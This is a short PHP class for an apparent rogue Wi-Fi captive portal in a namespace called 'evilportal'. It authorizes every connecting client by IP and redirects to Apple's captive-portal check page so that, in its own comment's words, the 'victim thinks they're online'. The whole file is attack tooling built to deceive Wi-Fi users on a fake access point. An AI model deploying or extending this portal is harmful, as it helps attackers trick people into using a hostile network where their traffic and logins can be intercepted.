<?php
namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        // Log the attempt regardless of success
        $this->authorizeClient($_SERVER['REMOTE_ADDR']);

        // Redirect to "success" — victim thinks they're online
        $this->showSuccess();
    }

    public function showSuccess()
    {
        header('Location: http://captive.apple.com/hotspot-detect.html', true, 302);
        exit();
    }

    public function showError()
    {
        echo "Connection failed. Please try again.";
    }
}
?>
